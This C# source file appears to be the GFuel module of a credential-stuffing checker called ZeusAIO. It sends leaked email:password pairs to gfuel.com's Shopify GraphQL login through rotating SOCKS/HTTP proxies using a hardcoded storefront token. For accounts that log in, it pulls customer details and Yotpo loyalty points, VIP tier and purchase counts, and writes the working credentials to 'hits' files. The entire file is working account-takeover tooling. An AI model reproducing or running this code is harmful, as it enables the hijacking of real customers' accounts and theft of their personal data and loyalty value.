using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using System.Text.RegularExpressions;
using Console = Colorful.Console;
using System.Drawing;
using Valorant;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using ZeusAIO;
using TunnelBear;
using System.Web;
using HttpRequest = Leaf.xNet.HttpRequest;

namespace Gfuel
{
    class Check
    {
        public static bool CheckAccount(string[] s, string proxy)
        {
            for (int i = 0; i < Config.config.Retries + 1; i++)
                while (true)
                    try
                    {
                    Retry:
                        using (HttpRequest req = new HttpRequest())
                        {
                            SetBasicRequestSettingsAndProxies(req);

                            req.AddHeader("Content-Type", "application/graphql; charset=utf-8");
                            req.AddHeader("Accept", "application/json");
                            req.AddHeader("X-Shopify-Storefront-Access-Token", "21765aa7568fd627c44d68bde191f6c0");
                            Leaf.xNet.HttpResponse res = req.Post(new Uri("https://gfuel.com/api/2020-01/graphql"), new BytesContent(Encoding.Default.GetBytes("mutation{customerAccessTokenCreate(input:{email:\"" + s[0] + "\",password:\"" + s[1] + "\"}){customerAccessToken{accessToken,expiresAt},userErrors{field,message}}}")));
                            string strResponse = res.ToString();

                            if (strResponse.Contains("\"accessToken\""))
                            {
                                string accessToken = Regex.Match(strResponse, "\"accessToken\":\"(.*?)\"").Groups[1].Value;
                                string capture = "";

                                capture = GFuelGetCaptures(accessToken, s[0]);
                                if (capture != "") break;
                                if (capture == "")
                                {
                                    ZeusAIO.mainmenu.hits++;
                                    if (Config.config.LogorCui == "2")
                                    {
                                        Console.WriteLine("[HIT - GFUEL] " + s[0] + ":" + s[1] + " | " + "Capture Failed", Color.Green);
                                    }
                                    Export.AsResult("/Gfuel_capturefailed_hits", s[0] + ":" + s[1]);
                                    return false;
                                }
                                ZeusAIO.mainmenu.hits++;
                                if (Config.config.LogorCui == "2")
                                {
                                    Console.WriteLine("[HIT - GFUEL] " + s[0] + ":" + s[1] + " | " + capture, Color.Green);
                                }
                                Export.AsResult("/Gfuel_hits", s[0] + ":" + s[1]);
                                return false;

                            }
                            else
                            {
                                break;
                            }
                            break;
                        }
                    }
                    catch
                    {
                        ZeusAIO.mainmenu.errors++;
                    
                    }
            return false;
        }
      
    static string GFuelGetCaptures(string token, string email)
    {
        while (true)
            try
            {
                using (HttpRequest req = new HttpRequest())
                {
                    SetBasicRequestSettingsAndProxies(req);

                    req.AddHeader("Content-Type", "application/graphql; charset=utf-8");
                    req.AddHeader("Accept", "application/json");
                    req.AddHeader("X-Shopify-Storefront-Access-Token", "21765aa7568fd627c44d68bde191f6c0");
                    string strResponse = req.Post(new Uri($"https://gfuel.com/api/2020-01/graphql"), new BytesContent(Encoding.Default.GetBytes("{customer(customerAccessToken:\"" + token + "\"){createdAt,displayName,email,id,firstName,lastName,phone}}"))).ToString();

                    if (strResponse.Contains("\"id\":\""))
                    {
                        string creation_date = Regex.Match(strResponse, "createdAt\":\"(.*?)\"").Groups[1].Value.Split('T')[0];
                        string userId = Regex.Match(strResponse, "\"id\":\"(.*?)\"").Groups[1].Value.Split('T')[0];
                        string decodedId = Check.Base64Encode(userId).Replace("gid://shopify/Customer/", "");

                        req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
                        req.AddHeader("Accept", "*/*");
                        string strResponse2 = req.Get($"https://loyalty.yotpo.com/api/v1/customer_details?customer_email={email}&customer_external_id={decodedId}&customer_token={token}&merchant_id=33869").ToString();

                        if (strResponse2.Contains("\"created_at\""))
                        {
                            string pointsBalance = Regex.Match(strResponse2, "\"points_balance\":(.*?),").Groups[1].Value;
                            string vipStatus = Regex.Match(strResponse2, ",\"campaign\":{\"title\":\"Earned Tier (.*?)\"").Groups[1].Value;
                            string purchases = Regex.Match(strResponse2, "\"purchases_made\":(.*?),").Groups[1].Value;

                            if (pointsBalance == "" || pointsBalance == "0")
                                return "Free";

                            return $"Points Balance: {pointsBalance} - Vip Status: {vipStatus} - Purchases: {purchases}";
                        }
                        return "";
                    }
                    else
                    {
                        return "";
                    }
                }
            }
            catch
            {
                    ZeusAIO.mainmenu.errors++;
                }
        return "";
    }
        public static string Base64Encode(string plainText)
        {
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
        }
        static void SetBasicRequestSettingsAndProxies(HttpRequest req)
        {
            req.IgnoreProtocolErrors = true;
            req.ConnectTimeout = 10000;
            req.KeepAliveTimeout = 10000;
            req.ReadWriteTimeout = 10000;

            {
                string[] proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount)).Split(':');
                ProxyClient proxyClient = ZeusAIO.mainmenu.proxyProtocol == "SOCKS5" ? new Socks5ProxyClient(proxy[0], int.Parse(proxy[1])) : ZeusAIO.mainmenu.proxyProtocol == "SOCKS4" ? new Socks4ProxyClient(proxy[0], int.Parse(proxy[1])) : (ProxyClient)new HttpProxyClient(proxy[0], int.Parse(proxy[1]));
                if (proxy.Length == 4)
                {
                    proxyClient.Username = proxy[2];
                    proxyClient.Password = proxy[3];
                }
                req.Proxy = proxyClient;
            }
        }
    }
}

